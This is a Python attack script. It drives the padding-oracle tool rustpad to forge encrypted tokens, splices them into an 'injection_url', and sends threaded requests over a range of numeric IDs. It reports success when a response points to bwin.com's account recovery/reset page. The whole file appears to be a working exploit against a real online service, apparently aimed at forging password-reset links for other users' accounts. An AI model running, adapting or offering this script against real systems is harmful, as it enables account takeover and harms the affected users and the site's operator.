import requests
import re
import os
import sys
from threading import Thread

def worker(job_number, from_thread=True):
    new_plaintext_append_number = re.sub(r"FUZZ", str(job_number), new_plaintext_append)
    new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 10').read().strip()
    start = len(new_ciphertext) - 48
    new_ciphertext = new_ciphertext[start:len(new_ciphertext)]
    print(f"new_ciphertext: {new_ciphertext} ")
    ciphertext = ciphertext_base + new_ciphertext
    test_url = re.sub(r"CTEXT", ciphertext, url)
    response = requests.get(test_url, allow_redirects=False)
    print(f"response code: {response.text}")
    if re.search("www.bwin.com/en/account/recovery/reset", response.text, re.MULTILINE) is not None:
        print(f"Found: {new_plaintext_append_number}")
        if from_thread:
            os._exit(0)
        else:
            return True

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("Usage: python batch.py <injection_url> <ciphertext_base> <new_plaintext_append> <job start> <job end> [threads] [sanity_check_id]")
        sys.exit(1)

    url = sys.argv[1]
    ciphertext_base = sys.argv[2]
    new_plaintext_append = sys.argv[3]
    job_start = int(sys.argv[4])
    job_end = int(sys.argv[5])

    threads = 5
    if len(sys.argv) > 6:
        threads = int(sys.argv[6])
    sanity_check_id = None
    if len(sys.argv) > 7:
        sanity_check_id = sys.argv[7]

    if sanity_check_id is not None:
        res = worker(sanity_check_id, False)
        if res:
            print("Sanity check passed")
        else:
            print("Sanity check failed")
            sys.exit(1)

    thread_arr = []
    direction = 1
    if job_end - job_start < 0:
        direction = -1
    for i in range(job_start, job_end, direction):
        thread_arr.append(Thread(target=worker, args=(i,)))
        if len(thread_arr) >= threads:
            print(f"Starting job {i - (threads-1)} - {i*direction}")
            for thread in thread_arr:
                thread.start()
            for thread in thread_arr:
                thread.join()
            thread_arr = []
    if len(thread_arr) > 0:
        print(f"Finishing last {len(thread_arr)} jobs")
        for thread in thread_arr:
            thread.start()
        for thread in thread_arr:
            thread.join()
        thread_arr = []